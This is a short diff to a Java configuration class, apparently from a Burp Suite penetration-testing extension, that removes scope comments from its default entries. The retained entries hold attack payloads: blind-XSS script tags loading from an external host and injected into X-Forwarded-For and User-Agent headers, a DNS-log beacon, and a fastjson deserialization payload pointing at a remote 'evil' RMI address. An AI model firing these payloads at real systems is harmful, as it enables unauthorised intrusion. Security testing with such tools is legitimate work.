@@ -35,8 +35,6 @@ public class ConfigTableModel extends AbstractTableModel{
 	public static final String Nmap_Command = "nmap -Pn -sT -sV --min-rtt-timeout 1ms "
 			+ "--max-rtt-timeout 1000ms --max-retries 0 --max-scan-delay 0 --min-rate 3000 {host}";
 
-	private static final String Global_Scope_Comment = "the scope is all requests！";
-	private static final String Scope_Comment = "the scope is controlled by the checkbox at the top";
 	private static final String Robot_Input_Comment = "this config effects how sqlmap and nmap runs";
 
 	public ConfigTableModel(){
@@ -72,14 +70,14 @@ public class ConfigTableModel extends AbstractTableModel{
 		//configEntries.add(new ConfigEntry("Proxy-UseRandomMode", "",ConfigEntry.Config_Proxy_Variable,true,false));
 		//以上都是固定基础变量，不需要修改名称和类型
 
-		configEntries.add(new ConfigEntry("Last-Modified", "",ConfigEntry.Action_Remove_From_Headers,true,true,Global_Scope_Comment));
-		configEntries.add(new ConfigEntry("If-Modified-Since", "",ConfigEntry.Action_Remove_From_Headers,true,true,Global_Scope_Comment));
-		configEntries.add(new ConfigEntry("If-None-Match", "",ConfigEntry.Action_Remove_From_Headers,true,true,Global_Scope_Comment));
-		configEntries.add(new ConfigEntry("OPTIONS", "",ConfigEntry.Action_Forward_And_Hide_Options,true,true,Global_Scope_Comment));
+		configEntries.add(new ConfigEntry("Last-Modified", "",ConfigEntry.Action_Remove_From_Headers,true,true));
+		configEntries.add(new ConfigEntry("If-Modified-Since", "",ConfigEntry.Action_Remove_From_Headers,true,true));
+		configEntries.add(new ConfigEntry("If-None-Match", "",ConfigEntry.Action_Remove_From_Headers,true,true));
+		configEntries.add(new ConfigEntry("OPTIONS", "",ConfigEntry.Action_Forward_And_Hide_Options,true,true));
 
-		configEntries.add(new ConfigEntry("X-Forwarded-For", "'\\\"><sCRiPt/src=//bmw.xss.ht>",ConfigEntry.Action_Add_Or_Replace_Header,true,true,Scope_Comment));
+		configEntries.add(new ConfigEntry("X-Forwarded-For", "'\\\"><sCRiPt/src=//bmw.xss.ht>",ConfigEntry.Action_Add_Or_Replace_Header,true,true));
 		//避免IP:port的切分操作，把Payload破坏，所以使用不带分号的简洁Payload
-		configEntries.add(new ConfigEntry("User-Agent", "'\\\"/><script src=https://bmw.xss.ht></script><img/src=%dnslogserver/%host>",ConfigEntry.Action_Append_To_header_value,true,true,Scope_Comment));
+		configEntries.add(new ConfigEntry("User-Agent", "'\\\"/><script src=https://bmw.xss.ht></script><img/src=%dnslogserver/%host>",ConfigEntry.Action_Append_To_header_value,true,true));
 		//configEntries.add(new ConfigEntry("knife", "'\\\"/><script src=https://bmw.xss.ht></script><img/src=%dnslogserver/%host>",ConfigEntry.Action_Add_Or_Replace_Header,true));
 
 		configEntries.add(new ConfigEntry("fastjson", "{\"@type\":\"com.sun.rowset.JdbcRowSetImpl\",\"dataSourceName\":\"rmi://%host.fastjson.%dnslogserver/evil\",\"autoCommit\":true}",ConfigEntry.Config_Custom_Payload,true));
